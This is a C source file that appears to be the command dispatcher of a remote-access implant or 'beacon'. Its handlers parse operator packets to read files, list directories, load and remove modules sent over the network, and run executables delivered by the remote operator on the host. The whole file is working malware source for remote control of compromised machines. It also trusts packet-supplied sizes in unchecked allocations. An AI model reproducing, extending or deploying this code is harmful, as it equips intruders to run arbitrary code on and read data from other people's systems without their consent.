#include "command.h"

int handle_cat(BEACONINFO *beaconInfo,struct packet_parser_struct *parser)
{
	uint32_t path_size = packet_parser_get_uint32(parser);
	char *path = malloc(path_size + 1);
	memset(path,0,path_size + 1);
	packet_parser_get_bytes(parser,path,path_size);

	DLX(2, printf("\tCOMMAND_CAT path_size %d \n",path_size));
	DLX(2, printf("\tCOMMAND_CAT path      %s \n",path));
			
	command_cat(beaconInfo,path);

	free(path);

	return 0;
}

int handle_ls(BEACONINFO *beaconInfo,struct packet_parser_struct *parser)
{
	uint32_t path_size = packet_parser_get_uint32(parser);
	char *path = malloc(path_size + 1);
	memset(path,0,path_size + 1);
	packet_parser_get_bytes(parser,path,path_size);

	DLX(2, printf("\tCOMMAND_DIR path_size %d \n",path_size));
	DLX(2, printf("\tCOMMAND_DIR path      %s \n",path));
			
	command_ls(beaconInfo,path);

	free(path);

	return 0;
}

int handle_insmod(BEACONINFO *beaconInfo,struct packet_parser_struct *parser)
{
	uint32_t mod_name_size = packet_parser_get_uint32(parser);
	char *mod_name = malloc(mod_name_size + 1);
	memset(mod_name,0,mod_name_size + 1);
	packet_parser_get_bytes(parser,mod_name,mod_name_size);

	uint32_t mod_size = packet_parser_get_uint32(parser);
	char *mod_data = malloc(mod_size+1);
	memset(mod_data,0,mod_size+1);
	packet_parser_get_bytes(parser,mod_data,mod_size);

	DLX(2, printf("\tCOMMAND_INSMOD mod name  %s \n",mod_name));
	DLX(2, printf("\tCOMMAND_INSMOD mod size  %d \n",mod_size));

	command_insmod(beaconInfo,mod_name,mod_data,mod_size);

	free(mod_data);
	free(mod_name);
	return 0;
}

int handle_exec(BEACONINFO *beaconInfo,struct packet_parser_struct *parser)
{
	uint32_t exe_name_size = packet_parser_get_uint32(parser);
	char *exec_name = malloc(exe_name_size + 1);
	memset(exec_name,0,exe_name_size + 1);
	packet_parser_get_bytes(parser,exec_name,exe_name_size);

	uint32_t exec_size = packet_parser_get_uint32(parser);
	char *exec_data = malloc(exec_size+1);
	memset(exec_data,0,exec_size+1);
	packet_parser_get_bytes(parser,exec_data,exec_size);

	DLX(2, printf("\tCOMMAND_REMOTEEXEC exec name  %s \n",exec_name));
	DLX(2, printf("\tCOMMAND_REMOTEEXEC exec size  %d \n",exec_size));

	command_exec(beaconInfo,exec_name,exec_data);

	free(exec_data);
	free(exec_name);
	return 0;
}

int handle_lsmod(BEACONINFO *beaconInfo,struct packet_parser_struct *parser)
{
	command_lsmod(beaconInfo);
	return 0;
}

int handle_rmmod(BEACONINFO *beaconInfo,struct packet_parser_struct *parser)
{
	uint32_t mod_name_len = packet_parser_get_uint32(parser);
	char *mod_name = malloc(mod_name_len + 1);
	memset(mod_name,0,mod_name_len + 1);
	packet_parser_get_bytes(parser,mod_name,mod_name_len);

	command_rmmod(beaconInfo,mod_name);

	free(mod_name);
	return 0;
}

int handle_usemod(BEACONINFO *beaconInfo,struct packet_parser_struct *parser)
{
	uint32_t mod_name_len = packet_parser_get_uint32(parser);
	char *mod_name = malloc(mod_name_len + 1);
	memset(mod_name,0,mod_name_len + 1);
	packet_parser_get_bytes(parser,mod_name,mod_name_len);

	char *argumentdata = NULL;
	uint32_t argumentSize = 0;
	argumentSize = packet_parser_get_uint32(parser);
	argumentdata = malloc(argumentSize + 1);
	memset(argumentdata,0,argumentSize + 1);
	packet_parser_get_bytes(parser,argumentdata,argumentSize);


	command_usemod(beaconInfo,mod_name,argumentdata,argumentSize);

	free(mod_name);
	free(argumentdata);
	return 0;
}

int handle_modinfo(BEACONINFO *beaconInfo,struct packet_parser_struct *parser)
{
	uint32_t mod_name_len = packet_parser_get_uint32(parser);
	char *mod_name = malloc(mod_name_len + 1);
	memset(mod_name,0,mod_name_len + 1);
	packet_parser_get_bytes(parser,mod_name,mod_name_len);

	command_modinfo(beaconInfo,mod_name);

	free(mod_name);
	return 0;
}